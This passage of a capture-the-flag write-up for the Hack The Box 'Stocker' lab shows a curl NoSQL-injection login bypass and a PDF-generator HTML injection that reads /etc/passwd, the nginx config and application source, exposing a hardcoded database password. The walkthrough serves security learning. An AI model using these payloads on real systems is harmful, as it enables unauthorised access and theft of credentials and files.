<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dev.stocker.htb</span><br></pre></td></tr></table></figure>
<p>还原hosts文件并添加hosts信息</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rm &#x2F;etc&#x2F;hosts</span><br><span class="line">mv &#x2F;etc&#x2F;hosts.bak &#x2F;etc&#x2F;hosts</span><br><span class="line">echo -e &quot;10.10.11.196\tdev.stocker.htb&quot; &gt; &#x2F;etc&#x2F;hosts</span><br></pre></td></tr></table></figure>
<h2 id="漏洞利用-21"><a class="markdownIt-Anchor" href="#漏洞利用-21"></a> 漏洞利用</h2>
<p>访问<code>dev.stocker.htb</code></p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/pentesting-web/nosql-injection#blind-nosql">https://book.hacktricks.xyz/pentesting-web/nosql-injection#blind-nosql</a></p>
</blockquote>
<p>NoSQL注入绕过登录</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl dev.stocker.htb/login --json <span class="string">&#x27;&#123;&quot;username&quot;: &#123;&quot;$ne&quot;: null&#125;, &quot;password&quot;: &#123;&quot;$ne&quot;: null&#125; &#125;&#x27;</span> -v</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">* Connected to dev.stocker.htb (154.38.66.218) port 80 (#0)</span><br><span class="line">&gt; POST &#x2F;login HTTP&#x2F;1.1</span><br><span class="line">&gt; Host: dev.stocker.htb</span><br><span class="line">&gt; User-Agent: curl&#x2F;7.87.0</span><br><span class="line">&gt; Content-Type: application&#x2F;json</span><br><span class="line">&gt; Accept: application&#x2F;json</span><br><span class="line">&gt; Content-Length: 55</span><br><span class="line">&gt; </span><br><span class="line">* Mark bundle as not supporting multiuse</span><br><span class="line">&lt; HTTP&#x2F;1.1 302 Found</span><br><span class="line">&lt; Server: nginx&#x2F;1.18.0 (Ubuntu)</span><br><span class="line">&lt; Date: Tue, 07 Mar 2023 14:16:51 GMT</span><br><span class="line">&lt; Content-Length: 0</span><br><span class="line">&lt; Connection: keep-alive</span><br><span class="line">&lt; X-Powered-By: Express</span><br><span class="line">&lt; Location: &#x2F;stock</span><br><span class="line">&lt; Vary: Accept</span><br><span class="line">&lt; Set-Cookie: connect.sid&#x3D;s%3AfJIaR20mVzvQQCGTeOLbI_uzbKaqBhDQ.1iY7jjKTmOGErnDSTPrCaAgRhmuV8m0NpczGe67RCfg; Path&#x3D;&#x2F;; HttpOnly</span><br><span class="line">&lt; </span><br><span class="line">* Connection #0 to host dev.stocker.htb left intact</span><br></pre></td></tr></table></figure>
<p>商品加入购物车并支付后生成订单PDF文件<br />
下载后查看exif信息</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exiftool 64074bcafc5e45f83e5036a5.pdf</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">ExifTool Version Number         : 12.49</span><br><span class="line">File Name                       : 64074bcafc5e45f83e5036a5.pdf</span><br><span class="line">Directory                       : .</span><br><span class="line">File Size                       : 39 kB</span><br><span class="line">File Modification Date&#x2F;Time     : 2023:03:07 09:36:19-05:00</span><br><span class="line">File Access Date&#x2F;Time           : 2023:03:07 09:36:31-05:00</span><br><span class="line">File Inode Change Date&#x2F;Time     : 2023:03:07 09:36:32-05:00</span><br><span class="line">File Permissions                : -rw-r--r--</span><br><span class="line">File Type                       : PDF</span><br><span class="line">File Type Extension             : pdf</span><br><span class="line">MIME Type                       : application&#x2F;pdf</span><br><span class="line">PDF Version                     : 1.4</span><br><span class="line">Linearized                      : No</span><br><span class="line">Page Count                      : 1</span><br><span class="line">Tagged PDF                      : Yes</span><br><span class="line">Creator                         : Chromium</span><br><span class="line">Producer                        : Skia&#x2F;PDF m108</span><br><span class="line">Create Date                     : 2023:03:07 14:36:05+00:00</span><br><span class="line">Modify Date                     : 2023:03:07 14:36:05+00:00</span><br></pre></td></tr></table></figure>
<p>Skia/PDF XSS to SSRF</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.triskelelabs.com/blog/extracting-your-aws-access-keys-through-a-pdf-file">https://www.triskelelabs.com/blog/extracting-your-aws-access-keys-through-a-pdf-file</a></p>
</blockquote>
<p>修改订单信息如下</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	<span class="attr">&quot;basket&quot;</span>:[&#123;</span><br><span class="line">			<span class="attr">&quot;_id&quot;</span>:<span class="string">&quot;638f116eeb060210cbd83a8d&quot;</span>,</span><br><span class="line">			<span class="attr">&quot;title&quot;</span>:<span class="string">&quot;&lt;iframe style=&#x27;width: 1000px;height: 1000px;&#x27; src=file:///etc/passwd&gt; &quot;</span>,</span><br><span class="line">			<span class="attr">&quot;description&quot;</span>:<span class="string">&quot;It&#x27;s a red cup.&quot;</span>,</span><br><span class="line">			<span class="attr">&quot;image&quot;</span>:<span class="string">&quot;red-cup.jpg../../../../../../etc/passwd&quot;</span>,</span><br><span class="line">			<span class="attr">&quot;price&quot;</span>:<span class="number">-1</span>,</span><br><span class="line">			<span class="attr">&quot;currentStock&quot;</span>:<span class="number">4</span>,</span><br><span class="line">			<span class="attr">&quot;__v&quot;</span>:<span class="number">0</span>,</span><br><span class="line">			<span class="attr">&quot;amount&quot;</span>:<span class="number">1</span></span><br><span class="line">		&#125;]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>生成订单PDF文件即可触发SSRF漏洞并获取/etc/passwd信息</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash</span><br><span class="line">daemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">bin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sys:x:3:3:sys:&#x2F;dev:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;sync</span><br><span class="line">games:x:5:60:games:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">man:x:6:12:man:&#x2F;var&#x2F;cache&#x2F;man:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">lp:x:7:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">mail:x:8:8:mail:&#x2F;var&#x2F;mail:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">news:x:9:9:news:&#x2F;var&#x2F;spool&#x2F;news:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">uucp:x:10:10:uucp:&#x2F;var&#x2F;spool&#x2F;uucp:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">proxy:x:13:13:proxy:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">www-data:x:33:33:www-data:&#x2F;var&#x2F;www:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">backup:x:34:34:backup:&#x2F;var&#x2F;backups:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:&#x2F;var&#x2F;list:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">irc:x:39:39:ircd:&#x2F;var&#x2F;run&#x2F;ircd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):&#x2F;var&#x2F;lib&#x2F;gnats:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">nobody:x:65534:65534:nobody:&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-network:x:100:102:systemd Network Management,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-resolve:x:101:103:systemd Resolver,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-timesync:x:102:104:systemd Time Synchronization,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">messagebus:x:103:106::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">syslog:x:104:110::&#x2F;home&#x2F;syslog:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">_apt:x:105:65534::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">tss:x:106:112:TPM software stack,,,:&#x2F;var&#x2F;lib&#x2F;tpm:&#x2F;bin&#x2F;false</span><br><span class="line">uuidd:x:107:113::&#x2F;run&#x2F;uuidd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">tcpdump:x:108:114::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">landscape:x:109:116::&#x2F;var&#x2F;lib&#x2F;landscape:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">pollinate:x:110:1::&#x2F;var&#x2F;cache&#x2F;pollinate:&#x2F;bin&#x2F;false</span><br><span class="line">sshd:x:111:65534::&#x2F;run&#x2F;sshd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-coredump:x:999:999:systemd Core Dumper:&#x2F;:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">fwupd-refresh:x:112:119:fwupd-refresh user,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">mongodb:x:113:65534::&#x2F;home&#x2F;mongodb:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">angoose:x:1001:1001:,,,:&#x2F;home&#x2F;angoose:&#x2F;bin&#x2F;bash</span><br><span class="line">_laurel:x:998:998::&#x2F;var&#x2F;log&#x2F;laurel:&#x2F;bin&#x2F;false</span><br></pre></td></tr></table></figure>
<p>读取文件<code>/etc/nginx/nginx.conf</code></p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	<span class="attr">&quot;basket&quot;</span>:[&#123;</span><br><span class="line">			<span class="attr">&quot;_id&quot;</span>:<span class="string">&quot;638f116eeb060210cbd83a8d&quot;</span>,</span><br><span class="line">			<span class="attr">&quot;title&quot;</span>:<span class="string">&quot;&lt;iframe id=&#x27;myFrame&#x27; style=&#x27;width: 1000px; height: 1000px;&#x27; src=&#x27;file:///etc/nginx/nginx.conf&#x27;&gt;&lt;/iframe&gt;&lt;script&gt;var frame = document.getElementById(&#x27;myFrame&#x27;);frame.onload = function () &#123;var body = frame.contentWindow.document.querySelector(&#x27;body&#x27;);body.style.fontSize = &#x27;0.3rem&#x27;;&#125;;&lt;/script&gt;&quot;</span>,</span><br><span class="line">			<span class="attr">&quot;description&quot;</span>:<span class="string">&quot;It&#x27;s a red cup.&quot;</span>,</span><br><span class="line">			<span class="attr">&quot;image&quot;</span>:<span class="string">&quot;red-cup.jpg../../../../../../etc/passwd&quot;</span>,</span><br><span class="line">			<span class="attr">&quot;price&quot;</span>:<span class="number">-1</span>,</span><br><span class="line">			<span class="attr">&quot;currentStock&quot;</span>:<span class="number">4</span>,</span><br><span class="line">			<span class="attr">&quot;__v&quot;</span>:<span class="number">0</span>,</span><br><span class="line">			<span class="attr">&quot;amount&quot;</span>:<span class="number">1</span></span><br><span class="line">		&#125;]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>文件<code>/etc/nginx/nginx.conf</code>内容如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line">user www-data;</span><br><span class="line">worker_processes auto;</span><br><span class="line">pid &#x2F;run&#x2F;nginx.pid;</span><br><span class="line">include &#x2F;etc&#x2F;nginx&#x2F;modules-enabled&#x2F;*.conf;</span><br><span class="line"></span><br><span class="line">events &#123;</span><br><span class="line">        worker_connections 768;</span><br><span class="line">        # multi_accept on;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">http &#123;</span><br><span class="line"></span><br><span class="line">        ##</span><br><span class="line">        # Basic Settings</span><br><span class="line">        ##</span><br><span class="line"></span><br><span class="line">        sendfile on;</span><br><span class="line">        tcp_nopush on;</span><br><span class="line">        tcp_nodelay on;</span><br><span class="line">        keepalive_timeout 65;</span><br><span class="line">        types_hash_max_size 2048;</span><br><span class="line">        # server_tokens off;</span><br><span class="line"></span><br><span class="line">        # server_names_hash_bucket_size 64;</span><br><span class="line">        # server_name_in_redirect off;</span><br><span class="line"></span><br><span class="line">        include &#x2F;etc&#x2F;nginx&#x2F;mime.types;</span><br><span class="line">        default_type application&#x2F;octet-stream;</span><br><span class="line"></span><br><span class="line">        ##</span><br><span class="line">        # SSL Settings</span><br><span class="line">        ##</span><br><span class="line"></span><br><span class="line">        ssl_protocols TLSv1 TLSv1.1 TLSv1.2 TLSv1.3; # Dropping SSLv3, ref: POODLE</span><br><span class="line">        ssl_prefer_server_ciphers on;</span><br><span class="line"></span><br><span class="line">        ##</span><br><span class="line">        # Logging Settings</span><br><span class="line">        ##</span><br><span class="line"></span><br><span class="line">        access_log &#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log;</span><br><span class="line">        error_log &#x2F;var&#x2F;log&#x2F;nginx&#x2F;error.log;</span><br><span class="line"></span><br><span class="line">        ##</span><br><span class="line">        # Gzip Settings</span><br><span class="line">        ##</span><br><span class="line"></span><br><span class="line">        gzip on;</span><br><span class="line"></span><br><span class="line">        # gzip_vary on;</span><br><span class="line">        # gzip_proxied any;</span><br><span class="line">        # gzip_comp_level 6;</span><br><span class="line">        # gzip_buffers 16 8k;</span><br><span class="line">        # gzip_http_version 1.1;</span><br><span class="line">        # gzip_types text&#x2F;plain text&#x2F;css application&#x2F;json application&#x2F;javascript text&#x2F;xml application&#x2F;xml application&#x2F;xml+rss text&#x2F;javascript;</span><br><span class="line"></span><br><span class="line">        ##</span><br><span class="line">        # Virtual Host Configs</span><br><span class="line">        ##</span><br><span class="line"></span><br><span class="line">        include &#x2F;etc&#x2F;nginx&#x2F;conf.d&#x2F;*.conf;</span><br><span class="line"></span><br><span class="line">        server &#123;</span><br><span class="line">            listen 80;</span><br><span class="line"></span><br><span class="line">            root &#x2F;var&#x2F;www&#x2F;dev;</span><br><span class="line">            index index.html index.htm index.nginx-debian.html;</span><br><span class="line"></span><br><span class="line">            server_name dev.stocker.htb;</span><br><span class="line"></span><br><span class="line">            location &#x2F; &#123;</span><br><span class="line">                proxy_pass http:&#x2F;&#x2F;127.0.0.1:3000;</span><br><span class="line">                proxy_http_version  1.1;</span><br><span class="line">                proxy_cache_bypass  $http_upgrade;</span><br><span class="line"></span><br><span class="line">                proxy_set_header Upgrade           $http_upgrade;</span><br><span class="line">                proxy_set_header Connection        &quot;upgrade&quot;;</span><br><span class="line">                proxy_set_header Host              $host;</span><br><span class="line">                proxy_set_header X-Real-IP         $remote_addr;</span><br><span class="line">                proxy_set_header X-Forwarded-For   $proxy_add_x_forwarded_for;</span><br><span class="line">                proxy_set_header X-Forwarded-Proto $scheme;</span><br><span class="line">                proxy_set_header X-Forwarded-Host  $host;</span><br><span class="line">                proxy_set_header X-Forwarded-Port  $server_port;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        server &#123;</span><br><span class="line">            listen 80;</span><br><span class="line"></span><br><span class="line">            root &#x2F;var&#x2F;www&#x2F;html;</span><br><span class="line">            index index.html index.htm index.nginx-debian.html;</span><br><span class="line"></span><br><span class="line">            server_name stocker.htb;</span><br><span class="line"></span><br><span class="line">            location &#x2F; &#123;</span><br><span class="line">                    try_files $uri $uri&#x2F; &#x3D;404;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        server &#123;</span><br><span class="line">            listen 80 default;</span><br><span class="line"></span><br><span class="line">            server_name _;</span><br><span class="line"></span><br><span class="line">            location &#x2F; &#123;</span><br><span class="line">                return 301 http:&#x2F;&#x2F;stocker.htb;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>得知虚拟主机<code>dev.stocker.htb</code>文件根目录为<code>/var/www/dev</code></p>
<p>尝试访问<code>/var/www/dev/index.js</code>, <code>/var/www/dev/app.js</code>, <code>/var/www/dev/main.js</code></p>
<p>服务主文件路径为<code>/var/www/dev/index.js</code><br />
内容如下</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&quot;express&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> mongoose = <span class="built_in">require</span>(<span class="string">&quot;mongoose&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> session = <span class="built_in">require</span>(<span class="string">&quot;express-session&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> MongoStore = <span class="built_in">require</span>(<span class="string">&quot;connect-mongo&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&quot;path&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&quot;fs&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; generatePDF, formatHTML &#125; = <span class="built_in">require</span>(<span class="string">&quot;./pdf.js&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; randomBytes, createHash &#125; = <span class="built_in">require</span>(<span class="string">&quot;crypto&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = express();</span><br><span class="line"><span class="keyword">const</span> port = <span class="number">3000</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> Configure loading from dotenv for production</span></span><br><span class="line"><span class="keyword">const</span> dbURI = <span class="string">&quot;mongodb://dev:IHeardPassphrasesArePrettySecure@localhost/dev?authSource=admin&amp;w=1&quot;</span>;</span><br><span class="line"></span><br><span class="line">app.use(express.json());</span><br><span class="line">app.use(express.urlencoded(&#123; <span class="attr">extended</span>: <span class="literal">false</span> &#125;));</span><br><span class="line">app.use(</span><br><span class="line">  session(&#123;</span><br><span class="line">    secret: randomBytes(<span class="number">32</span>).toString(<span class="string">&quot;hex&quot;</span>),</span><br><span class="line">    resave: <span class="literal">false</span>,</span><br><span class="line">    saveUninitialized: <span class="literal">true</span>,</span><br><span class="line">    store: MongoStore.create(&#123;</span><br><span class="line">      mongoUrl: dbURI,</span><br><span class="line">    &#125;),</span><br><span class="line">  &#125;)</span><br><span class="line">);</span><br><span class="line">app.use(<span class="string">&quot;/static&quot;</span>, express.static(__dirname + <span class="string">&quot;/assets&quot;</span>));</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&quot;/&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> res.redirect(<span class="string">&quot;/login&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&quot;/api/products&quot;</span>, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">  <span class="keyword">if</span> (!req.session.user) <span class="keyword">return</span> res.json([]);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> products = <span class="keyword">await</span> mongoose.model(<span class="string">&quot;Product&quot;</span>).find();</span><br><span class="line">  <span class="keyword">return</span> res.json(products);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&quot;/login&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (req.session.user) <span class="keyword">return</span> res.redirect(<span class="string">&quot;/stock&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> res.sendFile(__dirname + <span class="string">&quot;/templates/login.html&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.post(<span class="string">&quot;/login&quot;</span>, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; username, password &#125; = req.body;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!username || !password) <span class="keyword">return</span> res.redirect(<span class="string">&quot;/login?error=login-error&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// <span class="doctag">TODO:</span> Implement hashing</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> user = <span class="keyword">await</span> mongoose.model(<span class="string">&quot;User&quot;</span>).findOne(&#123; username, password &#125;);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!user) <span class="keyword">return</span> res.redirect(<span class="string">&quot;/login?error=login-error&quot;</span>);</span><br><span class="line"></span><br><span class="line">  req.session.user = user.id;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">console</span>.log(req.session);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> res.redirect(<span class="string">&quot;/stock&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.post(<span class="string">&quot;/api/order&quot;</span>, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">  <span class="keyword">if</span> (!req.session.user) <span class="keyword">return</span> res.json(&#123;&#125;);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!req.body.basket) <span class="keyword">return</span> res.json(&#123; <span class="attr">success</span>: <span class="literal">false</span> &#125;);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> order = <span class="keyword">new</span> mongoose.model(<span class="string">&quot;Order&quot;</span>)(&#123;</span><br><span class="line">    items: req.body.basket.map(<span class="function">(<span class="params">item</span>) =&gt;</span> (&#123; <span class="attr">title</span>: item.title, <span class="attr">price</span>: item.price, <span class="attr">amount</span>: item.amount &#125;)),</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="keyword">await</span> 